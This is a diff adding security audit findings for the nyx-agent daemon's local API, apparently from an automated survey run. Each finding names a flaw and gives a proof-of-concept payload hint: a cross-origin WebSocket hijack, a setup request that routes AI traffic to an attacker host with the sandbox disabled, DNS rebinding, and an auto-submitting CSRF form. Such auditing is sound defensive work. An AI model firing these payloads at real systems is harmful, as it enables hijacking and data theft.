@@ -1,3 +1,69 @@
 phase23.exploration.v1 task=expl-demo
 survey-only run (ALLOWED HOSTS empty, TARGETS empty)
 findings emitted via record_exploration_finding payload below
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyx-agent-api/src/router.rs",
+  "line": 1425,
+  "cap": "AUTH_BYPASS",
+  "endpoint": "GET /api/v1/events (WebSocket upgrade)",
+  "rationale": "events_ws performs no Origin-header check before on_upgrade. WebSockets are not subject to the SOP same-origin restriction that gates fetch(); any cross-origin page the operator visits can open ws://127.0.0.1:<port>/api/v1/events and stream every AgentEvent (scan output, repo paths, finding bodies). The bearer-token gate runs first, but the fallback `?token=` URL-query auth (router.rs:116) means a token leaked via Referer / browser history / TraceLayer logs is enough to mount a Cross-Site WebSocket Hijack. Missed by the static pass because the bypass is a *missing* check, not a tainted-flow sink.",
+  "suggested_payload_hint": "from a non-loopback origin: new WebSocket('ws://127.0.0.1:8088/api/v1/events?token='+leakedToken) — confirm operator-side run events stream out cross-origin."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyx-agent-api/src/router.rs",
+  "line": 85,
+  "cap": "AUTH_BYPASS",
+  "endpoint": "POST /api/v1/setup (pre-config window)",
+  "rationale": "auth_layer exempts /api/v1/setup, /setup/status, /setup/doctor whenever setup.is_complete() is false. Between daemon start and the operator's first wizard submission, anyone who can reach the listener can POST a SetupRequest with i_own_this:true, sandbox_backend:'process' (disables kernel isolation), and ai_runtime:'local-llm' + attacker-controlled local_llm_url, then watch all subsequent AI calls flow to their endpoint. i_own_this is a single-bit attestation, not a challenge. Race window is short on a warm install but unbounded on a fresh provision. Static pass missed this because the *intended* policy and the *bypassable* policy share the same code path — the bug is a state-machine flaw (transient-trust window), not a tainted sink.",
+  "suggested_payload_hint": "POST /api/v1/setup, Content-Type: application/json, body {\"ai_runtime\":\"local-llm\",\"local_llm_url\":\"https://attacker/api\",\"sandbox_backend\":\"process\",\"i_own_this\":true}"
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyx-agent/src/main.rs",
+  "line": 816,
+  "cap": "DNS_REBIND",
+  "endpoint": "all /api/v1/* via operator-configured listen_addr",
+  "rationale": "TcpListener::bind uses config.ui.listen_addr verbatim (operator override on CLI). No Host-header allowlist anywhere in the router. If listen_addr is 0.0.0.0 (common foot-gun) or the operator merely visits a malicious page while the daemon is bound to 127.0.0.1, DNS-rebinding resolves attacker-controlled hostnames to 127.0.0.1 after the first response, so subsequent fetches from the foreign origin hit the loopback API with browser-side SOP satisfied. Combined with `?token=` URL-query auth (router.rs:116) and absent CorsLayer, a rebind primitive lets a remote attacker pivot to full API access once any token leaks. Static pass missed because no flow is involved — the gap is the absence of `host == 127.0.0.1 || host == localhost` middleware.",
+  "suggested_payload_hint": "DNS server with 5s TTL: first answer = attacker IP, second answer = 127.0.0.1; victim visits http://rebind.example/, JS calls fetch('/api/v1/runs?token=<guess>')."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyx-agent-api/src/router.rs",
+  "line": 116,
+  "cap": "CRED_EXPOSURE",
+  "endpoint": "all auth-gated /api/v1/* (token in ?token=)",
+  "rationale": "check_query_token accepts the bearer in the URL query string. TraceLayer::new_for_http() (router.rs:63) writes the request URI to tracing output by default, so every authenticated request logs the bearer in cleartext to whatever subscriber the operator wired (stderr, file, journald, etc). URL-query tokens also leak via browser history, Referer on navigation, and any reverse-proxy access log placed in front of the daemon. The constant-time comparison at :129 is defeated upstream because the secret already crossed three logging surfaces. Static pass missed because the bug is a misuse pattern (logging-by-default of a transport-level secret), not a missing escape.",
+  "suggested_payload_hint": "grep daemon stderr / journald output for 'token=' after any authenticated GET; confirm the bearer is recoverable from logs."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyx-agent-api/src/router.rs",
+  "line": 887,
+  "cap": "CSRF",
+  "endpoint": "POST /api/v1/scan?repo=&token= (also /quarantine/:id/promote, /quarantine/:id/dismiss)",
+  "rationale": "trigger_scan takes only Query parameters — no JSON body required. From a browser's perspective this is a CORS *simple* request (POST + no custom headers + no body), so a cross-origin attacker page can fire it without preflight. The bearer can ride along in `?token=` (router.rs:116), which a victim's referrer/history may already have leaked. Result: any page the operator visits while logged in can spam scans (DoS via runaway repo clone/sandbox spin) or, against a misconfigured repo, force scan paths the operator did not initiate. Same shape applies to /quarantine/:id/promote and /quarantine/:id/dismiss. Static pass missed because the CSRF surface is the *absence* of (a) CorsLayer with credential-aware policy, (b) Origin/Sec-Fetch-Site checks, (c) anti-CSRF token — all missing controls.",
+  "suggested_payload_hint": "<form method=POST action='http://127.0.0.1:8088/api/v1/scan?repo=victim-repo&token=LEAKED' enctype='text/plain'><input name=x value=y></form><script>document.forms[0].submit()</script>"
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyx-agent/src/main.rs",
+  "line": 840,
+  "cap": "OS_COMMAND",
+  "endpoint": "<cli:--open-cmd>",
+  "rationale": "The --open-cmd <cmd> flag is fed straight to std::process::Command::new(&cmd).arg(&url_for_open). No allowlist. Command::new bypasses the shell, so URL metacharacters do not inject; however the cmd value itself is taken verbatim from the CLI, so any caller that builds the daemon invocation from semi-trusted state (orchestration script reading env, supervisord with config drift, etc.) is one substitution away from arbitrary binary spawn at startup. Low severity in isolation, but pairs cleanly with the pre-setup auth-bypass finding: an attacker who reaches the wizard could plant a remediation hint pointing the operator at `--open-cmd /tmp/payload`. Static pass missed because Command::new() with a literal-looking variable does not match the canonical OS-injection sink shape (no shell, no format!).",
+  "suggested_payload_hint": "n/a — defence is a positive allowlist for --open-cmd (xdg-open, open, start) or drop the flag on production builds."
+}
